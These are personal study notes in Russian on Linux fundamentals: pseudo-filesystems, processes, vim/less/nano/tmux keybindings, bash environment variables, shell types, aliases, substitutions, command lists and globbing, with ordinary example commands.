устройства (в псевдофайловой системе /dev/ - tty pty printers мониторы мыши клавиатуры ) и 
в псевдофайловой системе /sys/  т.д.).  И следовательно к ней/к нему следует  обращаться с 
использованием 4 основных системных вызовов: "открыть" "прочитать" "записать" "закрыть" !!! 
 Дополнительные основные   wait, exec, fork, exit и kill stat Системный вызов — 
Википедия (wikipedia.org)
Псевдофайловые системы Linux - специальный (файловый) интерфейс для доступа к информации ядра ОС
Псевдофайловые системы Linux  отображаются при выполнении команды mount

Любая выполняющаяся программа (процесс) это также "файл" в псевдофайловой системе procfs (=имеет файловый интерфейс в Unix/Linux) !!
Процесс есть запущенная в специальном контейнере ОС - программа, часть программы или несколько
 программ.
Процессы: 1)ядра, на самом деле не процессы, а нити 2)демоны - процессы системных служб
 3)пользовательские/прикладные процессы.
Первый процесс init/systemd. Планировщик процессов у придает процессу PID и PPID (
идент родительского процесса). Каждый процесс запускается от имени и пользователя (user-id) и
 группы (group-id), и имеет столько же прав, сколько прав у пользователя который его запустил.
 Для каждого процесса создается папка в /proc/<pid>
Программами (последовательностями инструкций ) являются (бывают) -  исполняемые файлы 
(компилированные или сценарии - «exe») и библиотеки (lib) ПОДРОБНЕЕ ЧИТАЙ В doc-файле
!Псевдофайловые системы proc , dev (devtmpfs, devfs), sys - директории, создаваемые только в процессе работы операц. системы (ядра), НЕ сохраняются на диске после завершения работы системы. Файлы в них служат интерфейсами ядра для программ к  устройствам , процессам

В общем: Файловая система = база данных о файлах и каталогах, создаваемая в ядре стр 96 !! Внутреннее устройство Linux ( PDFDrive )/  "Файловая система является разновидностью базы данных; она поддерживает структуру, призванную трансформировать простое блочное устройство в замысловатую иерархию файлов и подкаталогов, которую пользователи способны понять. Файловая система - интерфейс/звено между ядром и пространством пользователя дисков »

Linux позволят работать с диcками как 1)через файловую систему /sys/, так и 2)через устройства /dev/
В этих каталогов БЕЗ монтирования (mount) видны разделы дисков 
----------!!!---------------!!!-------------------------!!!-----------------------
!!! command -x [аргументы ключей/параметров команды] |(или/исключение)  argument1...argumentN //структура команды в man [](опциональные параметры)

to hands over  - передать
up-to-date - современный

ПРОДОЛЖИТЬ!! 19 03 2023

1Создать аварийную fs (искл файлы ядра на /boot) и воcстановить с
аварийного save  CD // см Кетов Админ-е 2.2
с флешки  
с apt inst kernel


xed & // запуск в фоне !!
view ex - аналог vim


= = VIM VI = = https://losst.pro/kak-polzovatsya-tekstovym-redaktorom-vim   
vi - !Осторожно, в нем можно запускать программы! -> :r!
Текстовый редактор Vim может работать в двух режимах.
 Первый режим, который используется по умолчанию при открытии редактора - это командный. В этом режиме вы можете вводить команды vi, а также использовать символьные клавиши для управления редактором.
 Второй режим - обычное редактирование текста, он работает так же как и редактирование текста в nano.
Для переключения в командный режим используется клавиша Esc.
Для переключения в режим редактирования - клавиша i

В командном режиме вы можете перемещаться по редактируемому тексту и выполнять действия над ним с помощью буквенных клавиш. Например, в командах ! для перемещения курсора вы можете набрать !цифру! перед командой чтобы указать на сколько символов или строк надо переместится. 
Для перемещения используются такие команды:
h - на один символ влево;
l - на один символ вправо;
j - на одну строку вниз;  !!
k - на одну строку вверх;  !!
w - на слово вправо;   !!
b - на слово влево;  !!
A -  перейти в конец строки;
H - перейти в низ экрана;
G - перейти в конец файла;
gg - перейти в начало файла;
<номер>G - перейти к конкретной строке;
. - перейти к последнему редактированию.

2. Режим редактирования
Для переключени в режим редактирования используются такие команды:
i - вставить текст с позиции курсора, символ под курсором будет заменен;
I - вставить текст в начало строки;
a - добавить текст начиная ОТ позиции курсора;
A - добавить текст В КОНЦЕ строки;
o - вставить новую строку после этой и начать редактирование;  
O - вставить новую строку перед этой и начать редактирование;
К этим командам тоже применимы символы повторения.
 командный режим нажав клавишу Esc.
ctrl-j - ввод/вставка новой строки

3. Удаление символов и строк
Вы можете править текст не только в обычном режиме, но и в командном с помощью команд.
Для этого применяются такие команды:
x или d+l или d+blank - удалить символ; !!!
d+w - удалить СЛОВО;
d+h - удалить символ слева;
dd - удалить всю строку;
D - удалить символы начиная от курсора и до конца строки.
Эти команды редактора vim работают немного по-другому после нажатия одной из них ничего не произойдет. Мы еще можем задать сколько раз нужно повторить команду, но также нужно указать количество символов, к которым она будет применена и направление, с помощью кнопок перемещения курсора. Это делается после нажатия команды. Например, для того чтобы удалить один символ справа наберите dl. Чтобы удалить два символа справа от курсора нажмите d3l, а чтобы удалить три строки вниз - d3j.
4. Замена символов В командном режиме вы можете не только удалять символы, но и заменять их на другие. Для этого существуют две команды:
r - заменить текущий символ;
R - заменить несколько символов.
Первая команда позволяет заменить один символ и вернутся в командный режим. Вторая команда будет заменять все символы, пока вы не вернетесь в командный режим нажатием клавиши Esc:
5. Отмена и повтор действий
В обычных текстовых редакторах вы можете использовать Ctrl+Z для отмены последних действий. В редакторе Vim есть собственная история действий. Она доступна в командном режиме. Если вы хотите отменить последнее изменение, просто нажмите u. Обратите внимание, что каждое следующее нажатие этой кнопки будет отменять предыдущее изменение сделанное в командном режиме. Например, если вы удалили один символ командой d, то он будет восстановлен.
Однако, если вы переключитесь в режим редактирования и сделаете там много изменений, а потом вернетесь в командный режим, то все эти изменения будут рассматриваться как одно. Если вы случайно отменили что-то важное, то можете повторить действие, нажав Ctrl+r/ Вот некоторые команды для отмены и повтора действий:
u - отменить последнее действие;  !!!
U - отменить последнее действие в текущей строке; !!!
. - повторить последнее действие; !!!
Ctrl+r - отменить отмену последнего действия.

6. Командная строка Vim
Командная строка Vim запускается в командном режиме нажатием двоеточия - ":". Здесь доступны команды для сохранения файла и выхода из редактора, настройки внешнего вида и взаимодействия с внешней оболочкой. Рассмотрим наиболее часто используемые команды редактора vim:

:w - сохранить файл;
:q - закрыть редактор;
:q! - закрыть редактор без сохранения;
:e файл - прочитать содержимое файла в позицию курсора;
:r файл - вставить в содержимое файла в следующую строку;
:r! - выполнить команду оболочки и вставить ответ в редактор;
:set переменная=значение - установить значение переменной, например, tabstop=4, или set number, с помощью этой команды можно управлять многими аспектами работы vim.
:buffers - посмотреть открытые файлы;
:reg - посмотреть содержимое буферов обмена.

7. Выделение и буфер обмена
Нажмите "v" когда вы находитесь в командном режиме для перехода в режим выделения.
Затем вы можете использовать кнопки перемещения курсора h, j, k, l для выделения нужных символов или строк:
Теперь вы можете выполнять какие-либо действия с выделенным текстом.
Например, можно его удалить, нажав кнопку d. Для того чтобы сбросить выделение нажмите кнопку Esc. Это ещё не всё. У Vim есть свой буфер обмена, который можно использовать для копирования и вставки текста. Этот буфер обмена состоит из нескольких регистров. Если не задать иное, то все команды работают с буфером обмена по умолчанию. Вот основные команды для копирования и вставки текста:
y - скопировать в буфер обмена;
yy or Y - скопировать строку в буфер обмена;
x - вырезать в буфер обмена;
p - вставить из буфера обмена.
d - удалить выделенное, u - отменить удаление
Команды для копирования и вырезания работают аналогично командам для удаления текста. Вы можете задать количество символов и направление или же просто выделить текст. Обратите внимание, что у каждого запущенного экземпляра Vim свой отдельный регистр буфера обмена, и он не связан с системным буфером обмена. Поэтому вы не сможете скопировать текст из одной программы в другую без дополнительных действий или настроек.

           = Less = 
less -S file.txt // отразить файл без переноса строк
less -N file.txt // отразить НУМЕРАЦИЮ строк в файле
Стрелка вниз, Enter, e или j - переместиться вниз на одну строку;
Стрелка вверх, y или k - переместиться на одну строку вверх;
Пробел - переместиться на одну страницу вниз;
b - переместиться на одну страницу вверх;
Стрелка вправо, стрелка влево - горизонтальна прокрутка;
g - перейти на первую строку;
G - перейти на последнюю строку;
p - перейти на позицию нужного процента сообщений. Например, 50p перенесет курсор на середину вывода;
/ - поиск по журналу;
n - найти следующее вхождение;
N - предыдущее вхождение;
q - выйти.
               = Nano  (help ctrl-G) =
https://basis.gnulinux.pro/ru/latest/basis/10/10._%D0%A2%D0%B5%D0%BA%D1%81%D1%82%D0%BE%D0%B2%D1%8B%D0%B5_%D1%80%D0%B5%D0%B4%D0%B0%D0%BA%D1%82%D0%BE%D1%80%D1%8B_nano_%D0%B8_vi.html
Alt+N - включить/отк нумерацию строк (нумря на пост основе nano ~/.nanorc добавить set linenumbers)
Alt+S - включить/отк перенос строк
Alt+U  - отменить действие 
Alt+^ - скопировать в буфер (аналог ctrl-с)
Alt+# - закоментировать строку (вставить # первым) 
Ctrl+A/E  перейти в начало/конец строки – , чтобы в конец – Ctrl+.
ctrl+T выполнить внешн команду, результат встиавить в nano!!!! 
ctrl+->/<- - перемещение между словами
ctrl+стрл.ввер/вниз  Перейти на начало/конец файла
ctrl+/ (ALT-G)    Перейти на указанный номер строки и столбца

                = head tail tac = =
tail -n +3 /etc/passwd // вывод строк файла, НАЧИНАЯ с 3й строки
tail -n 3 /etc/passwd // вывод последних 3х строк файла
tail -3 /etc/passwd // вывод последних 3х строк файла

head -5  /etc/passwd // вывод первых 5ти строк файла
head -n 5 /etc/passwd // вывод первых 5ти строк файла
head -c 30 /etc/passwd //вывод первых 300 байт файла
 
выделить 5ю строку файла:
tail -n +3 /etc/passwd | head -1 
tail -n +6 /etc/passwd | head -n 1

tac /etc/passwd //Вывод строк файлов в обратном порядке , противоположность cat!


 = tmux  терминальный мультиплексор = =
https://losst.pro/shpargalka-po-tmux?ysclid=ll1afjmfnd333103759
Команды tmux для управления сессиями, которые вы можете использовать:
attach-session (attach) - подключиться к уже существующей сессии. В параметре необходимо передать опцию -t и идентификатор сессии;
detach-session (detach) - отключить всех клиентов (или переданного с помощью опции -t) от сессии, переданной в опции -s;
has-session - проверить существует ли сессия, аналогично, надо передать идентификатор сессии;
kill-server - остановить все запущенные сессии;
kill-session - завершить сессию переданную в параметре -t;
list-clients - посмотреть клиентов, подключенных к сессии -t;
list-sessions (ls) - вывести список всех запущенных сессий;
new-session - создать новую сессию, можно передать имя сессии в опции -s и стартовую директорию в опции -c;
rename-session - переименовать сессию, нужно передать идентификатор сессии и новое имя;
Ctrl+b c - создать новое окно;
Ctrl+b w - выбрать окно из списка;
Ctrl+b 0-9 - открыть окно по его номеру;
Ctrl+b , - переименовать текущее окно;
Ctrl+b % - разделить текущую панель по горизонтали;
Ctrl+b " - разделить текущую панель по вертикали;
Ctrl+b стрелка - перейти на панель, находящуюся в стороне, куда указывает стрелка;
Ctrl+b Ctrl+стрелка - изменить размер текущей панели;
Ctrl+b o - перейти на следующую панель;
Ctrl+b ; - переключаться между текущей и предыдущей панелью;
Ctrl+b x - закрыть текущую панель;
Ctrl+b [ - войти в режим копирования (подробнее ниже);
Ctrl+b ] - вставить из внутреннего буфера обмена tmux;
Ctrl+b d - отключится от текущей сессии;
Ctrl+b : - открыть командную строку.
создать сессию командой new-session и задать ей удобное имя: tmux new-session -s losst
Посмотреть список сессий можно командой ls: tmux ls
tmux new-session -s vic подключиться к сессии
Отключение от сессии Чтобы отключиться от текущей сессии достаточно нажать сочетание клавиш Ctrl+b d.


ЗАГРУЗЧИК GRUB ( init systemd  ) читай отдельный файл grub2.doc!!


         =  = BASH,  ПЕРЕМЕННЫЕ ОКРУЖЕНИЯ  =  =
alt+t поменять местами 2 соседних аргумента в командной строке
   $cp f1 f2 alt+t -> $cp f2 f1
alt+> копировать и повторить последний аргумент из history в командной строке
постраничное листание в teminale(графическом GUI lightdm) shift+PGdown/UP

  *** Встроенная команда bash: "source" она же "."   ***
см man bash, секция:  
        .  filename [arguments], source filename [arguments]
  Прочитает и выполнит команды (разделенные ";") из файла в текущей среде оболочки и вернет статус 
завершения последней команды, выполненной из имени файла.Если имя файла не содержит косой черты,
имена файлов в PATH используются для поиска каталога, содержащего имя файла. 
$echo "ls; pwd; cat f1" > packet_prog  // создать пакетный файл с программами
$. packet_prog // выполнить пакетный файл - поледовательно ls; pwd; cat f1
 по сути представлет собой выполнение файла-скрипта, но не имеющего возможность 
 запускаться самостоятельно  (т.е. без chmod ugp+x)
   !!! применяется широко внутри файлов, см /etc/profile, ~/.bashrc и др
      if [ -f /etc/bash.bashrc ]; then  . /etc/bash.bashrc fi
      if [ -f ~/.bash_aliases ]; then . ~/.bash_aliases  fi

https://wiki.merionet.ru/servernye-resheniya/43/peremennye-okruzheniya-v-linux-kak-posmotret-ustanovit-i-sbrosit/
Переменные имеют следующий формат:
KEY=value
KEY="Some other value"
KEY=value1:value2
Должны соблюдаться следующие правила:
Имена переменных чувствительны к регистру (регистрозависимы) - должны быть написаны большими буквами (UPPER CASE).
Несколько значений переменных разделяются двоеточием :
Вокруг символа = нет пробела
Переменные можно разделить на две категории:
Переменные окружения (Environmental Variables) - это переменные, которые определены для текущей
  оболочки и наследуются любыми дочерними оболочками или процессами. Переменные окружения 
  используются для передачи информации в процессы, которые порождаются из оболочки.
Переменные оболочки (Shell Variables) - это переменные, которые содержатся исключительно в 
  оболочке, в которой они были установлены или определены. Они часто используются для отслеживания 
  эфемерных данных, например, текущего рабочего каталога.
Cписок всех переменных окружения, используя команд env, printenv, set | less
с помощью printenv можно запросить значения отдельных переменных: printenv SHELL
Общий набор переменных окружения в Linux
USER: текущее имя пользователя, использующего систему
EDITOR: какая программа запускается для редактирования файла на вашем хосте
HOME: домашний каталог текущего пользователя
PATH: список каталогов, разделенных двоеточиями, в которых система ищет команды
PS1: основная строка приглашения (для определения отображения приглашения оболочки)
PWD: текущий рабочий каталог
_: самая последняя команда, выполненная в системе пользователем
MAIL: путь к почтовому ящику текущего пользователя
SHELL: оболочка, используемая для интерпретации команд в системе, она может быть много разных (например, bash, sh, zsh или другие)
LANG: кодировка языка, используемая в системе
DESKTOP_SESSION: текущий рабочий стол, используемый на вашем хосте (GNOME, KDE)
HISTFILESIZE: количество строк истории команд, сохраненных в файле истории
HISTSIZE: количество строк истории, разрешенных в памяти
UID: текущий UID для пользователя
HOSTNAME: имя компьютера системы
TERM: указывает тип терминала
OLDPWD: предыдущий рабочий каталог
BASHOPTS: список параметров, которые использовались при выполнении bash.
BASH_VERSION: версия bash, выполняемая в удобочитаемой форме.
BASH_VERSINFO: версия bash с машиночитаемым выводом.
COLUMNS: Количество столбцов в ширину, которые используются для вывода вывода на экран.
DIRSTACK: стек каталогов, доступных с помощью команд pushd и popd.
IFS: внутренний разделитель полей для разделения ввода в командной строке. По умолчанию это пробел.
SHELLOPTS: параметры оболочки, которые можно установить с помощью параметра set.
 *** Установка переменных окружения в Linux ***
1) способ установить ВРЕМЕННО переменные окружения - использовать команду 
   export - объявить переменную - переменной окружения
export VAR="value"; printenv VAR -> value; Если просто VAR="value"; printenv VAR -> ' '
2) Самый популярный способ ПОСТОЯННОЙ установки переменных среды - это добавить 
 запись export VAR="value" в файл .bashrc.
Файл .bashrc - скрипт, выполняемый, когда инициализируете сеанс оболочки.
Когда запускаете новый терминал или просто используете screen сессию, 
  будет использоваться файл .bashrc.
echo "export TZ="AmericaNew_York" >> ~.bashrc // !Я не работет, только если вручную прописать!
   // Войте в режим редактирования файла, добавить export TZ="AmericaNew_York"
Сохраните файл,используйте команду "source" для перезагрузки файла bashrc для текущего сеанса оболочки.
source ~/.bashrc	
                         * * Типы оболочек bash и др* *  
книга Внутреннее устройство Linux ( PDFDrive ).pdf стр324
+https://basis.gnulinux.pro/ru/latest/basis/17/17._su.html
Существует несколько различных типов экземпляров оболочки.
Типы интерактивный и неинтерактивный,
1) Интерактивными оболочками являются те, которые вы применяете для запуска команд из терминала,
могут быть разделены на 
1.1) Интерактивные оболочки для входа в систему (loginshell)
echo $0 
-bash //знак "-" признак оболочки входа в систему 
!! отличие loginshell от non-loginshell: пользоватль заходит в СВОЙ home каталог
su - mvn или su -l mvn // войти в сеанс оболочки loginshell от пользователя mvn
pwd -> /home/mvn // !! заходит в правильный домашний каталог mvn! 
Когда оболочка bash запущена для входа в систему, она читает 
a) соглсно книге:  читает файл /etc/profile  После этого она ищет  файлы 
   ~/.bash_profile, ~/.bash_login и ~/.profile, читая только первый файл, который обнаружит.
b) Соглсно https://basis.gnulinux.pro/ru/latest/basis/17/17._su.html
 сначала читает  /etc/profile а заодно смотрит  /etc/profile.d/*. После этого
   ~/.bash_profile, ~/.bashrc и /etc/bash.bashrc  

1.2) Интерактивные оболочки не для входа в систему (non-loginshell)
echo $0 
bash //отсутвие знака "-" признак оболочки входа в систему 
su mvn // войти в сеанс оболочки non-loginshell от пользователя mvn
pwd -> /home/oem //! НЕ заходит в правильный домашний каталог!!
После запуска в качестве оболочки не для входа в систему оболочка bash выполняет
a) файл /etc/bashrc,   а затем запускает читает ~/.bashrc
b) файл ~/.bashrc -> /etc/bash.bashrc,
2) Неинтерактивные оболочки - например, те, которые запускают сценарии оболочки

Свои можно сохранять  в файлах .profile и .bashrc
Изменить НА ПОСТОЯННОЙ ОСНОВЕ переменные окружения языка в bash - добавить запись
  LANG=ru_RU.utf8 или  LANG=be_BY.utf8 c помощью редактора nano ./.bashrc 

PATH  https://losst.pro/peremennaya-path-v-linux?ysclid=lmxl1qfpcy257514415
В Ubuntu значение переменной PATH содержится в файле /etc/environment,
 в некоторых других дистрибутивах её также можно найти и в файле /etc/.profile.

Если добавить в конец файла команду export, то для каждой загружаемой оболочки
 будет автоматически выполняться добавление имени требуемой папки в переменную PATH, 
 но только для текущего пользователя:
nano ~/.bashrc

export PATH=$PATH:/opt/local/bin

echo $PS1 - формат приветствия (oem@LnxPC:$)
echo $PWD - вывести перем.окуржения текущего каталогов
echo $SHELL - вывести текущий cmd - /bin/bash

$LANG=en_US.UTF-8 //Изменить ДО КОНЦА СЕАНСА

~.* - файлы в ~ каталоге, начинающиеся с точки ".*"  всегда конфигурационные файлы, в остальных папках - не обязательно

env ИЛИ printenv // переменные окружения (терминала). Долговременно перем-е хранятся в конфиг.файлах(.profile, .bashrc...)
printenv LANG // запросить значения отдельных переменных:

Переменная окружения PATH: Указание тех мест, где оболочка ищет программы
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin

!!! автосоздание /home/oem/bin в PATH
echo $PATH //в  PATH ОС linux автоматически добавит путь для исполняиемых 
   программ bin при создании вручную в домашнем каталоге каталога bin /home/oem/bin:.... 
!!!
 
 = = = многострочный ввод (перенос) команд при помощи \ = = = 
ls \  // знаком \ можно разделять команду по разным строкам !
 -i \
  -l \
равносильно ls -il

locale  // get locale-specific information ВЫВЕСТИ СПИСОК МЕСТНЫХ ПЕРЕМЕННЫХ ОКРУЖЕНИЯ !!!
LANG=ru_RU.UTF-8
LANGUAGE=
LC_CTYPE="ru_RU.UTF-8"
LC_NUMERIC=be_BY.UTF-8
LC_TIME="ru_RU.UTF-8"
LC_COLLATE="ru_RU.UTF-8"
LC_MONETARY=be_BY.UTF-8
LC_MESSAGES="ru_RU.UTF-8"

внутр команды bash
type 
LANG=ru_RU.utf8    LC_CTYPE="ru_RU.utf8"  LC_NUMERIC="ru_RU.utf8"   LC_TIME="ru_RU.utf8"
LC_COLLATE="ru_RU.utf8"  LC_MONETARY="ru_RU.utf8"  LC_MESSAGES="ru_RU.utf8" LC_PAPER="ru_RU.utf8"
LC_NAME="ru_RU.utf8" LC_ADDRESS="ru_RU.utf8" LC_TELEPHONE="ru_RU.utf8" 
Добавить переменную окружения 
export TZ="America/New_York"  //внутр команда присвоить значение переменной окружения
export A1=Velcom //  внутр команда,  присвоить значение переменной окружения и сохранить его
                  в /usr/lib/locale/locale-archive.  Доступ по env или export -p
export -p | grep A1
  declare -x A1="Velcom"
env | grep A1
  A1=Velcom

source .bashrc// для загрузки из файла .bashrc пер. окружения (заранее записанной в не nano), 
 обновление переменной окружения в терминале 
source ./.bash_aliase //!! внутр команда bash, заставляющая перечитать конфиг файл и сразу
  применять созданные в нем псевдонимы. Без нее - только выйти и снова зайти в bash


   * * Псевдонимы программ  .bash_aliases * *
https://ru.linux-console.net/?p=139&ysclid=lm3nzypd17721018657#gsc.tab=0

alias //вывод всех псевдонимов команд
alias pingnull='ping 127.1.1.1 > /dev/null' or png.txt //задать псевдоним команды для команд
   интерпретатора bash

type ll // подробно о псевдониме(aliase) ll
ll — это псевдонимом для «ls -alF»

команда alias  добавляет псевдоним в текущий сеанс, !!но не сохранаяет для дальнейшего применения.

Псевдонимы на уровне пользователя !ДОЛЖНЫ! быть определены в ОТДЕЛЬНОМ файле .bash_aliases!!
# Alias definitions. You may want to put all your additions into a separate file like
# ~/.bash_aliases, instead of adding them here directly.
if [ -f ~/.bash_aliases ]; then . ~/.bash_aliases fi

source ./.bash_aliase //!! внутр команда bash, заставляющая перечитать конфиг файл и сразу
  применять созданные в нем псевдонимы. Без нее - только выйти и снова зайти в bash

Можете создать собственный файл псевдонима в любом каталоге и добавить определение в .bashrc
  или .profile, чтобы загрузить его.!!!!Но лучше так не делать,сохранять в .bash_aliases!!!

Добавление общесистемных псевдонимов
Чтобы задать глобальный псевдоним - изменить файл /etc/bash.bashrc и добавить псевдонимы,
  которые будут действовать глобально.

Запуск программ выполняется bash(sh) c использованием переменной PATH
~/oem/bin - автоматом добавляется в PATH при перезагрузке bash
   * * END псевдонимы программ  .bash_aliases * *



      = = = ПОДСТАНОВКИ (в bash) №1 = = =
cp /etc/fstab{,.bak} // скопировать /etc/fstab в /etc/fstab.bak
   // Работает это так- первый аргумент в { - отсутсвует, поэтому 1ая подстановка "cp /etc/fstab", 
   //  2ая подстановка (после {, ) - "fstab.bak", в итоге "cp /etc/fstab /etc/fstab.bak" 
echo file{,_bak,_bak2}
  file file_bak file_bak2
echo $(($((5**2)) * 3)) +подстановки!
echo ~ -> /home/oem
echo ~/* // файлы кроме скрытых -> /home/oem/Desktop /home/oem/f1.txt /home/oem/f2.txt /home/oem/f33 /home/oem/f3.cpi /home/oem/ffps /home/oem/!initfiledebian /home/oem/psp_mvn.jpg.jpeg /
echo ~/.* //скрытые файлы -> /home/oem/. /home/oem/.. /home/oem/.bash_history /home/oem/.bash_logout /home/oem/.bashrc /
   ls -ild .* | less
echo Число_{1..5} -> Число_1 Число_2 Число_3 Число_4 Число_5
echo {Z..A} -> Z Y X W V U T S R Q P O N M L K J I H G F E D C B A
echo a{A{1,2},B{3,4}}b -> aA1b aA2b aB3b aB4b
echo $(ls)  Desktop Documents ls-output.txt Music Pictures Public Templates Videos
ls -l $(which cp) = ls -l `which cp` //-rwxr-xr-x 1 root root 141824 фев  7  2022 /usr/bin/cp
$ echo "$(cal)"  
echo "Баланс счета $USER: \$5.00" -> Баланс счета oem: $5.00
echo "Сигнал" $'\a' -> подать сигнал
set // отобразить/изменить параметры оболочки, переменных окружения, локальных переменных и функций оболочки
set | less // set при вызове без параметров и аргументов выводит переменные обоих типов — командной оболочки и окружения, — а также все объявленные функции командной оболочки.
set -x // Включить трассировку (построчный вывод) выполняемых команд в bash !!
set +x // вЫключить трассировку (построчный вывод) выполняемых команд в bash !!

a) $ls ~
     + ls --color=auto /home/oem //set -x показывает реальный вызов программы с парметрами(-color=auto)
b) При нажатии tab - показывает скртипт исполняемых команд подстановки

https://www.bugsfighter.com/ru/remove-m-gsearch-co-hijacker/#download-removal-tool




в man help [] - опциональные параметры
~ //дом dir
./ //текущ dir
../ //род dir
cd - // возврат в каталог из которой перешли шаг назад
cd //= cd ~ // возврат в домашний каталог
Xed; vi; nano; less; - редактор
man boot | cat // вывести справку на вывод терминала чтобы можно было делать прокурутку текста

  * * *  Подстановки Substitution (в bash) №2  * * *

A) Шаблонные выражения Patternes  - служат для поиска определенных имен файлов
~ home
* любое количесво любых символов
? один любой символ
[0-9] один любой символ от 0 до 9
[b-f] один любой символ от b до f
[akmp] один любой символ из a,k,m,p
find / [mp]* // найти файлы начинающиеся на m или p
ls [fa][a-z]*  // найти файлы начинающиеся на f или a, вторая буква  от a-z
arx2.tar         arx_gzip.tar  arx_xz.tar  ffind  file.pcap  frx.txt
arx_compess.tar  arx.tar       fcat        ffps   find.txt

ls [f4]* 
444   45     f1lnk2  f1.txt

E) Экранирование
е1) Одиночное (односимвольное)
'\'  Экранирование для одиночного служебного МЕТАсимовла (\ ~ * # $ % ' ' ? < > ! ..) символа.
 echo \\abc => \abc  //экранировать знак "\"  (=> - вывод)
 echo \$100 > f; 
  cat f  => $100
е2) Общее #  Экранированировать всю строку целиком
e3.1)Групповое 'm1...mN' - Жесткой/сильное (безусловное) экранирование, выводит все висмолы и все МЕТАсимволы "как есть", без попытки их интерпретировать как служебные 
 echo '\$100'
  \$100
e3.2)  Групповое "m1...mN" - слабое (условное) экранирование, выводит МЕТАсимволы с попыткой их интерпретировать как служебные 
echo "\$100"
  $100
p1=abc; echo "$100 $p1"
=> 00 abc // $1 - воспринято как вывод переменной, которой ничего не присвоено,поэтому пустота вместо нее
B) Подстановка команд  
b1)`cmnd х y ..` или $(cmnd х y ..)  // результата выполнения одиночной команды
stat `which top` или  stat $(which top) // подстановка пути файла в команду stat
ls -ilL $(which write) // подстановка инф. о файле, на которую ссылается ссылка  /usr/bin/write
  -rwxr-sr-x 1 root tty 22912 фев 21  2022 /usr/bin/write
// команда write - передача сообщений между терминалами, дает возможность запуска (s) для группы пользователей tty 
b2) cmnd1  `cmnd2` ... `cmndn` или cmnd1  $(cmnd2) ... $(cmndN)  // вложенных результатов выполнения команд cmnd2 ... cmndN в команду cmnd1
b3) cmnd1  $(cmnd2 $(cmnd3))  // вложенных результатов выполнения команды cmnd3 в команду cmnd2, команды cmnd2 в команду cmnd1 

ppp=$(which man); echo $ppp
 =>/usr/bin/man
p2=`which man`; echo $p2
 =>/usr/bin/man

C) Подстановка выражений
с1) $((выражение)) с2)$[выражение]
D) Подстановка параметров : переменных окуржения, позиционных параметров программмы (скрипта), переменных оболочки bash (например: pwd, cd, help, set   см type -a pwd set cd ...)
type -a pwd set cd
  pwd — это встроенная команда bash
  pwd является /usr/bin/pwd
  pwd является /bin/pwd
  set — это встроенная команда bash
  cd — это встроенная команда bash

d1) $param 
d2)${param}  -эта форма применяется для вывода параметров в сочетании с др. данными, например:  
prm1=123; echo ${prm1}adc => 123abc

str1=abc
str2=_def        // соединение строк слияние строк
c=${p}${b}; echo $c
abc_def

d3) команда bash -  "let" присвоения переменной результата выражения
let "RES=(100-70)*2"
echo $RES -> 60

d4) f="file5.zip"
echo "${f%.zip}" # вывод значения f за исключением части ".zip"
file5

S) Списки команд:
// Любая программа в POSIX имеет код возврата, равный 0 - при Успешном выполнении программы, <> 0 (>0) - при НЕУспешном выполнении программы,
s1) Асинхронные (параллельные)  списки - команды запускются bash одновременно, завершаются в разное время, в зависимости от готовности исполнения каждой отдельной программы
cmndn1 & cmndn2 & ... & cmndnN
s1.1) cmndn1 & - запустить команду в фоновом режиме, // "второй" - неявной программой будет возврат в оболочку командного интерпретатора
s2) Cинхронные (последовательные)  списки - 
s2.1) Список без условий  cmndn1 ; cmndn2 ; cmndnN ровно cmndn1 & cmndn2 & ... & cmndnN 
s2.2) Список "И"  cmndn1 && cmndn2 && cmndnN  - выполняется до первого Неуспеха, т.е. до первой cmndni,  возвратившей значение <>0
s2.3) Список "ИЛИ"  cmndn1 || cmndn2 || cmndnN  - выполняется до первого Успеха, т.е. до первой cmndni,  возвратившей значение = 0

"cmndn1 && cmndn2"  ==  "if cmndn1=true; then cmndn2"
cat f.txt && echo "ok" // если f.txt существует, вывод его и паечать "оk"
content of f.txt
ok

"cmndn1 || cmndn2"  ==  "if cmndn1<>true; then cmndn2"
cat fxxx.txt || echo "not ok"// если f.txt НЕ существует, вывод его и печать "not оk"
cat: fxxx.txt: Нет такого файла или каталога
not ok


"if cmndn1=true; then cmndn2 else cmndn3 if"== равносильно
   "cmndn1=true &&  cmndn2 || cmndn3" if СТОП 14 09 2023

ls file5 2>/dev/null && cat file5 || echo error 
error // результат, если файл file5 не существует



ПЕРЕДАЧА И ЧТЕНИЕ ЗАЧЕНИЙ, ПЕРЕДАННЫХ ПО КОНВЕЙЕРУ в stdin
echo file | (read a; touch '/tmp/'$a; ll '/tmp/'$a) // прочитать из конв-ра от echo "file" в
   переменную а, затем создать файл в каталоге /tmp/file  скобки () важны!

echo one1 two2 | (read a b; echo $a'+'$b;) // прочитать 2 вход параметра из конвеера
one1+two2

       EXIT STATUS код выхода программы
для программ EXIT STATUS следует смотреть в man или --help (иногда) 
По умолчанию (по соглашению) программы при завершении возвращают 
   EXIT STATUS=0 если ок, >0 - иначе
код завершения конвейера — код завершения последней команды в конвеере. 

echo $? // просмотр код выхода предыдущей выполненой команды/программы
cat hplip22
cat: hplip22: Нет такого файла или каталога
echo $?
1
	 = = end подстановки BASH = =

 = = GLOBBING = = 
 man 7 NAME       glob - globbing pathnames
     Ranges
       There is one special convention: two characters separated by '-' denote a range.  (Thus, "[A-Fa-f0-9]" is equivalent to "[ABCDEFabcdef0123456789]".)  One may  in‐
       clude  '-'  in  its literal meaning by making it the first or last character between the brackets.  (Thus, "[]-]" matches just the two characters ']' and '-', and
       "[--0]" matches the three characters '-', '.', '0', since '/' cannot be matched.)

       Complementation
       An expression "[!...]" matches a single character, namely any character that is not matched by the expression obtained by removing the first '!' from it.   (Thus,
       "[!]a-]" matches any single character except ']', 'a' and '-'.)

ls -d [Dda]* все файлы, начинающиеся с буквы D d a
ls -d [a-d]*(=[!a-d]*) все файлы, начинающиеся с буквы a b c d
ls -d1 /etc/[sd]*.{conf,d} файлы, которые начинаются на s или d и заканчиваются на .conf или .d
grep "[^A-C7-8]' list #выделить символы, отличные от начальных ABC78
ls -la p*+(.txt|.png) = ls -la p*.txt p*.png
-rw-rw-r-- 1 oem oem     113 path.txt
-rw-rw-r-- 1 oem oem 1475810 plan_vselub.png

"^$" - пустая строка в регулярных выражениях
grep -Ev "^\s*(#|$)" /etc/apache2/apache2.conf // искл строки, начинающ с пробелов и пустые или
  за которыми следуют #
 
grep -v "^#" /etc/apache2/apache2.conf | grep -v "^$"
равано  grep -Ev "^#|^$" /etc/apache2/apache2.conf 
